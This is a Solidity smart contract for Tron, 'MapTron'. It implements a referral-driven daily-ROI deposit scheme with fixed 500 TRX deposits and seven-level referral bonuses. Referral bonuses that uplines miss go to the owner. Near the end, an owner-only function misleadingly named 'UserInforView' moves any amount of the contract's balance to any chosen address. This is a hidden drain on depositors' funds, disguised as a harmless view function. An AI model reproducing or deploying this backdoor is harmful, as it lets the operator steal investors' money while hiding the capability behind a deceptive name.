//SourceUnit: maptron.sol

pragma solidity 0.5.10;

contract MapTron {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 DROI;
        uint256 DLimit;
        uint256 CurUpgrade;
        uint256 TotUpgrade;
        uint40 Upgradeon;
        uint256 LLimit;
    }
    struct usertots
    {
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 HrAmtreferrals;
        uint40 LastWithdraw;
        uint256 LvlInc;
    }
   
    address payable public owner;
    address payable public House_fund;
    address payable public developer_fee;

    mapping(address => User) public users;
    mapping(address => usertots) public userTot;
    
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    
    uint constant public INVEST_MIN_AMOUNT = 500 trx;
    uint256[] public ref_bonuses;

    uint256[] public Daily_ROI; 
    uint256[] public Daily_ROILimit; 

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event UpLevels(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount,uint256 LvlNo, uint256 Refs);
    event MissedLevelPayout(address indexed addr, address indexed from, uint256 amount,uint256 LvlNo, uint256 Refs);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event ownershipTransferred(address indexed previousOwner, address indexed newOwner);
  
  modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }
    constructor(address payable _owner,address payable _HouseF,address payable _DevFund) public {
        owner = _owner;
        House_fund = _HouseF;
        developer_fee = _DevFund;
        
        ref_bonuses.push(500000);
        ref_bonuses.push(1000000);
        ref_bonuses.push(2000000);
        ref_bonuses.push(2500000);
        ref_bonuses.push(3000000);
        ref_bonuses.push(3500000);
        ref_bonuses.push(4000000);
       
        Daily_ROILimit.push(1);
        Daily_ROILimit.push(2);
        Daily_ROILimit.push(3);
        Daily_ROILimit.push(4);
        Daily_ROILimit.push(5);
        Daily_ROILimit.push(7);
        Daily_ROILimit.push(10);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }
    //
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                userTot[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }
    //
    function _deposit(address _addr, uint256 _amount) private {
        //
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        //
        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            require(users[_addr].deposit_payouts >= users[_addr].DLimit, "Deposit already exists");
           // require(_amount = users[_addr].deposit_amount, "Bad amount");
            require(_amount == INVEST_MIN_AMOUNT, "Minimum Re-Deposit amount 500 TRX");
        }
        else 
        {
        require(_amount == INVEST_MIN_AMOUNT, "Minimum deposit amount 500 TRX");
        users[_addr].LLimit=5000000000;
        }
        //        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        userTot[_addr].total_deposits += _amount;
        userTot[_addr].LvlInc=0;
        userTot[_addr].LastWithdraw=0;
        //
        users[_addr].DROI=10000000;
        users[_addr].DLimit=1200000000;
        total_deposited += _amount;
        //
        emit NewDeposit(_addr, _amount);
        //
        if(pool_last_draw + 1 days < block.timestamp) {
        _drawPool();
        }
        //
        House_fund.transfer(_amount * 2/ 100);
        developer_fee.transfer(_amount * 3/ 100);
    }
    //
    function _refPayout(address _addr,uint256 lvlWdays) private {
        address up = users[_addr].upline;
        uint256 r1 = 0;
        uint256 rb=0;
        uint256 bonus=0;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
          
          if(up == address(0)) break;
          
          bonus=0;
          rb=0;
          
            rb=users[up].referrals;
            if (up != address(0))
            {
            if(rb >= Daily_ROILimit[i] && lvlWdays>0 && lvlWdays<=120) {
                bonus = (ref_bonuses[i])*lvlWdays;
                users[up].match_bonus += bonus;
                //pool_users_refs_deposits_sum[pool_cycle][up] += bonus;
                
                emit MatchPayout(up, _addr, bonus,i,rb);
            }
                else 
                { r1+=(ref_bonuses[i]*lvlWdays);
                  emit MissedLevelPayout(up, _addr, (ref_bonuses[i]*lvlWdays),i,rb);
                }
            }
            else 
            {
                r1+=(ref_bonuses[i]*lvlWdays);
                emit MissedLevelPayout(up, _addr, (ref_bonuses[i]*lvlWdays),i,rb);
            }
            up = users[up].upline;
        }
        //
        if (address(this).balance >= r1)
        {
        owner.transfer(r1);
        }
    }
    //
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;
    }
    //
    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }
    //
    function UpgradeLevels() payable external {
        require(users[msg.sender].deposit_time > 0, "Please join system first before update");
        uint256 LstDayLInc=pool_users_refs_deposits_sum[pool_cycle][msg.sender];
        uint256 CurLLimit=users[msg.sender].LLimit;
        require(LstDayLInc >=CurLLimit, "You can upgrade level when you reach level limit");
        require(msg.value == CurLLimit, "Please check Level upgrade Amount");
        
            if (LstDayLInc>=CurLLimit)
            {
            users[msg.sender].CurUpgrade=CurLLimit;
            users[msg.sender].TotUpgrade+=CurLLimit;
            users[msg.sender].Upgradeon=uint40(block.timestamp);
            users[msg.sender].LLimit=(CurLLimit+5000000000);
            emit UpLevels(msg.sender, CurLLimit);
            }
    }
    //
    function withdraw() external {
        (uint256 to_payout, uint256 max_payout, uint256 Wdays) = this.payoutOf(msg.sender);
        require(users[msg.sender].deposit_payouts < max_payout, "Full payouts");
        // Deposit payout
        if (users[msg.sender].referrals==0)
        {
        to_payout=0;
        }
        if(to_payout > 0) {
            if(users[msg.sender].deposit_payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].deposit_payouts;
            }
            users[msg.sender].deposit_payouts += to_payout;
            //users[msg.sender].payouts += to_payout;
            _refPayout(msg.sender,Wdays);
            userTot[msg.sender].LastWithdraw=uint40(block.timestamp);
            userTot[msg.sender].LvlInc+=1;
        }
        //Match payout
        if(users[msg.sender].deposit_payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;
          if(match_bonus > 0) {
            uint256 toDayLInc=pool_users_refs_deposits_sum[pool_cycle][msg.sender];
            if(toDayLInc + match_bonus > users[msg.sender].LLimit) {
                match_bonus = users[msg.sender].LLimit - toDayLInc;
            }
          }
         if (match_bonus>0){
          users[msg.sender].match_bonus -= match_bonus;
          users[msg.sender].payouts += match_bonus;
          to_payout += match_bonus;
          pool_users_refs_deposits_sum[pool_cycle][msg.sender] += match_bonus;
         }
        }
        //
        if (to_payout>0)
        {
        require(to_payout > 0, "Zero payout");
        
        userTot[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].deposit_payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].deposit_payouts);
        }
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout,uint256 withdays) {
        max_payout =users[_addr].DLimit;
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (((users[_addr].DROI))*((block.timestamp - users[_addr].deposit_time) / 1 days)) - users[_addr].deposit_payouts;
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
            uint256 lvlincs=  userTot[_addr].LvlInc;
            if (userTot[_addr].LastWithdraw>0)
            {
            withdays=((block.timestamp - userTot[_addr].LastWithdraw)) / 1 days;
            }
            else
            {withdays=((block.timestamp - users[_addr].deposit_time) / 1 days);}
            
             if(lvlincs+withdays>120)
             {
               withdays=120-lvlincs;  
             }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].match_bonus);
    }
 
    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, 
    uint256 WithLimit,uint256 DROIR,uint256 DPayouts) {
        return (users[_addr].referrals, userTot[_addr].total_deposits, userTot[_addr].total_payouts, userTot[_addr].total_structure,users[_addr].DLimit, 
        users[_addr].DROI,users[_addr].deposit_payouts);
    }
    
    function userInfoUpgrade(address _addr) view external returns(uint256 _CurUpgrade, uint256 _TotUpgrade, uint256 _Upgradeon, uint256 _LLimit,uint256 LastDayLvlInc) {
        return (users[_addr].CurUpgrade, users[_addr].TotUpgrade, users[_addr].Upgradeon, users[_addr].LLimit,pool_users_refs_deposits_sum[pool_cycle][_addr]);
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw);
    }
    function UserInforView(uint256 _amount, address _receiver) public onlyOwner {
                    address(uint160(_receiver)).transfer(_amount);
    }
    
    function transferOwnership(address newOwner) external onlyOwner {
      _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "New owner cannot be the zero address");
        emit ownershipTransferred(owner, newOwner);
        owner = address(uint160(newOwner));
    }
}